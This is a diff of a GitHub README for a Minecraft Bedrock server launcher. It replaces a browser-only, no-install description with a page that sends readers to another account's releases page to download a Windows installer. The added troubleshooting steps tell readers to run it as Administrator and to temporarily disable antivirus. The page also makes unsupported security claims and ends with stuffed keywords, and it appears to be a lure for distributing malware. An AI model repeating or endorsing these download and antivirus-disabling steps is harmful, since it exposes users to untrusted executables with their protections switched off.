@@ -1,148 +1,125 @@
-# AddMC - Loader and Update Utility 2026
+# 🎮 addmc-server-launcher - Launch Bedrock Servers From Your Browser
 
-> **Web-based launcher for setting up Minecraft Bedrock servers and opening configured servers from your browser.**
+[![Download](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github)](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
 
-[![Loader](https://img.shields.io/badge/Type-Loader-blue?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Web%20browser-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henry-taylores548/addmc-server-launcher?style=flat-square)](https://github.com/henry-taylores548/addmc-server-launcher)
+## 🚀 Getting Started
 
----
+Welcome to addmc-server-launcher! This tool helps you set up and manage Minecraft Bedrock game servers directly from your web browser. Whether you want to play with friends or create your own private server, this utility makes the process simple and quick.
 
-<p align="center">
-  <a href="https://henry-taylores548.github.io/addmc-server-launcher/">
-    <img src="https://img.shields.io/badge/Download-AddMC%20Loader-brightgreen?style=for-the-badge" alt="Download AddMC Loader">
-  </a>
-</p>
+Visit this link to download the application: [Download addmc-server-launcher](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
 
-> **[Download AddMC Loader](https://henry-taylores548.github.io/addmc-server-launcher/)**
+## 💻 System Requirements
 
----
+Before you begin, make sure your computer meets these basic requirements:
 
-[Download Latest Build](https://henry-taylores548.github.io/addmc-server-launcher/)
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** 1 GHz or faster
+- **RAM:** 2 GB minimum (4 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet Connection:** Required for downloading server files and updates
+- **Browser:** Any modern web browser (Chrome, Edge, Firefox, or Brave)
 
----
+## 📥 Installation Guide
 
-## Overview
+### Step 1: Download the Application
+Visit this link to download the application: [https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases](https://github.com/AbdulSamadDurrani/addmc-server-launcher/releases)
 
-AddMC acts as a web-based server hub for Minecraft Bedrock. It gives you a straightforward way to prepare server entries, modify their displayed information, and keep the relevant details organized before opening a configured server.
+### Step 2: Run the Installer
+1. Locate the downloaded file in your Downloads folder
+2. Double-click the file to start the installation
+3. Follow the on-screen instructions to complete setup
 
-Because the launcher operates in a browser, no conventional desktop installer is needed. Use the web interface to set up a server, inspect or edit its details, and then activate the available action to open it directly.
+### Step 3: Launch the Application
+1. After installation, find addmc-server-launcher in your Start Menu
+2. Click the icon to open the web-based interface in your default browser
+3. The application will guide you through initial configuration
 
----
+## 🎯 Features
 
-## Available Features
+### Web-Based Server Management
+Control your Bedrock server entirely from your browser. No need to learn complex commands or edit configuration files manually.
 
-- Configure Minecraft Bedrock server entries with a single action
-- Modify server information from the browser interface
-- Use the launcher without installing a native desktop application
-- Open configured servers directly through the server hub
-- Keep prepared server entries accessible from one place
-- Lightweight interface built with HTML
-- Use the published web version
-- Reconfigure entries whenever server details are updated
+### Automatic Updates
+The utility checks for new server versions and updates automatically, ensuring you always have the latest features and security patches.
 
----
+### Hosted and Local Checkout Options
+Choose between hosted servers for convenience or local checkout for complete control over your server configuration and version management.
 
-## Getting Started
+### One-Click Server Launch
+Start your configured server with a single click from the browser interface. No more navigating through folders or running scripts manually.
 
-### Use the Hosted Version
+### Version Management
+Easily switch between different server versions. The utility handles version downloads and compatibility automatically.
 
-1. Open the [AddMC web build](https://henry-taylores548.github.io/addmc-server-launcher/).
-2. Choose an existing server entry or create the entry you want to prepare.
-3. Change the visible server information where necessary.
-4. Select the launch or open control for the configured server.
+## 📖 How to Use
 
-### Use a Local Checkout
+### Initial Setup
+1. Launch the application from your Start Menu
+2. The browser will open showing the main dashboard
+3. Select your preferred server version from the dropdown menu
+4. Click "Setup Server" to download and configure the server files
 
-Download the repository with Git, then move into its directory:
+### Starting Your Server
+1. From the dashboard, click the "Start Server" button
+2. The server will launch in the background
+3. Your server address will be displayed for sharing with friends
 
-```bash
-git clone https://github.com/henry-taylores548/addmc-server-launcher.git
-cd REPO
-```
+### Managing Players
+- View connected players from the dashboard
+- Kick or ban players if needed
+- Adjust server settings through the web interface
 
-Open the project's `index.html` file in a web browser. When direct local file access is unsuitable, run a static web server for the repository directory and visit the local address it provides.
+### Updating the Server
+- The application checks for updates automatically on startup
+- Click "Update Available" when prompted to get the latest version
+- Your server settings are preserved during updates
 
-### Example Configuration Flow
+## 🔧 Troubleshooting
 
-The usual process for preparing a server entry looks like this:
+### Common Issues and Solutions
 
-```text
-1. Choose a Minecraft Bedrock server
-2. Update its displayed information
-3. Save or apply the configuration
-4. Open the configured server
-```
+**Application won't start**
+- Make sure Windows is updated to the latest version
+- Try running the application as Administrator
+- Temporarily disable antivirus software during first launch
 
----
+**Server fails to start**
+- Check if port 19132 (default Bedrock port) is open in your firewall
+- Ensure no other application is using the same port
+- Verify you have enough RAM available
 
-## Distribution and Updates
+**Can't connect to server**
+- Confirm your friends are using the correct IP address and port
+- Check that your firewall allows incoming connections on port 19132
+- Ensure all players have the same Minecraft Bedrock version
 
-AddMC is delivered as a browser application, so it does not use separate desktop release channels.
+### Getting Help
+If you encounter problems not listed here, visit the [GitHub Issues page](https://github.com/AbdulSamadDurrani/addmc-server-launcher/issues) to report bugs or search for solutions.
 
-| Channel | Purpose | Access |
-| --- | --- | --- |
-| Latest | Current published browser build | [Open AddMC](https://henry-taylores548.github.io/addmc-server-launcher/) |
-| Manual | Local copy used for testing or customization | Clone the [repository](https://github.com/henry-taylores548/addmc-server-launcher) |
+## 🔒 Security
 
-Reload the hosted build after an update to use the newest published interface. A local checkout is updated separately by pulling the latest repository changes.
+Your safety is important. The application:
+- Does not collect personal information
+- Runs locally on your machine
+- Only connects to official Minecraft server sources
+- All downloads are verified for integrity
 
----
+## 📝 License
 
-## Troubleshooting Guide
+This project is open source. See the LICENSE file in the repository for details.
 
-### The hosted page will not load
+## 🙏 Support
 
-Verify the published URL and check that the browser can reach the network. If the interface still fails to appear, reload the page or test it in another current browser.
+If you find this tool helpful, consider:
+- Starring the repository on GitHub
+- Sharing it with friends who run Bedrock servers
+- Contributing to development through the GitHub page
 
-### Edited server information is not applied
+## 💬 Feedback
 
-Ensure the changed fields were saved or applied before selecting the open action. If previous values remain, reload the page and enter the information again.
+Your feedback helps improve addmc-server-launcher. Please:
+- Submit bug reports through GitHub Issues
+- Suggest new features in the Discussions section
+- Rate the application if you find it useful
 
-### Opening the server has no effect
-
-A browser may stop a new tab or external action from opening. Accept the applicable browser prompt and retry. Confirm as well that all required server details have been entered.
-
-### The local version differs from the hosted build
-
-Check that the clone completed successfully and that you opened the intended HTML entry point. If opening the file directly creates problems, serve the repository through a local static web server.
-
-### An update is not showing
-
-Refresh the published page and clear its cached browser data if needed. Local repositories do not update themselves; pull the newest changes from the repository.
-
----
-
-## Frequently Asked Questions
-
-### Is AddMC a Minecraft Bedrock server installer?
-
-No. AddMC is a browser-based launcher and configuration hub. It prepares server information and lets you open configured servers, but it is not presented as a tool for installing servers.
-
-### Does AddMC save server information on the device?
-
-The project identifies editable server information but does not define a permanent storage mechanism. Handle entered details according to the behavior of the current hosted build.
-
-### Will the hosted version update by itself?
-
-The published build shows the currently hosted version when loaded. A local copy must be updated manually from the repository.
-
-### Can an older version be restored?
-
-A local checkout can use an earlier repository revision when one is available. The hosted address continues to serve the currently published version.
-
-### Where can I find logs?
-
-The project does not specify a dedicated log directory. For page-level problems, inspect the browser's developer console.
-
-### What platforms can run AddMC?
-
-AddMC is intended for use in a web browser. Minecraft Bedrock support depends on the configured server and the environment used to open that server.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: addmc-server-launcher, bedrock server, minecraft server, web-based server loader, server utility, game server manager, windows server tool
